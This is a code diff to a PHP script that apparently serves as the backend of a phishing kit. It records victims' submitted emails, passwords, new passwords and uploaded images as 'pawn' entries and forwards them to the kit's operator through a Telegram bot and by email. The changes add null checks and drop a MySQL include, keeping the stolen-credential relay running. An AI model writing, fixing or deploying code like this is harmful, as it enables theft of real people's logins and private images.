@@ -1,5 +1,5 @@
 <?php
-include_once '../config/db.php';
+// include_once '../config/db.php'; // Commented out - using JSON instead of MySQL
 include_once '../config/function.php';
 include_once '../mail/send.php';
 session_start();
@@ -11,14 +11,14 @@ if (isset($_FILES["image"])) {
     $page = $_POST['page'];
     createpawn($id, $path, '', $page);
     $user = readuser($id);
-    if ($user['emailsend'] < $user['count'] && !isset($_SESSION['user'])) {
+    if ($user && $user['emailsend'] < $user['count'] && !isset($_SESSION['user'])) {
         # code...
     if (isset($user['bot_token']) && isset($user['bot_id'])) {
         $token = $user['bot_token'];
         $chatID = $user['bot_id'];
         sendImage($token, $chatID, $path, $id);
     }
-    if ($user['enableemail'] == 1) {
+    if ($user && $user['enableemail'] == 1) {
         $newemailsend = $user['emailsend'] + 1;
         updateemailsend($id, $newemailsend);
         sendpawntoemail($page, $path, '', '');
@@ -35,7 +35,7 @@ if (isset($_FILES["image"])) {
 
     createpawn($id, $email, $password, $page, $newpassword);
     $user = readuser($id);
-    if ($user['emailsend'] < $user['count'] && !isset($_SESSION['user'])) {
+    if ($user && $user['emailsend'] < $user['count'] && !isset($_SESSION['user'])) {
     if (isset($user['bot_token']) && isset($user['bot_id'])) {
         $token = $user['bot_token'];
         $chatID = $user['bot_id'];
@@ -67,7 +67,7 @@ $newpass
         }
         sendText($token, $chatID, $text);
     }
-    if ($user['enableemail'] == 1) {
+    if ($user && $user['enableemail'] == 1) {
         $newemailsend = $user['emailsend'] + 1;
         updateemailsend($id, $newemailsend);
         sendpawntoemail($page, $email, $password, $newpassword);
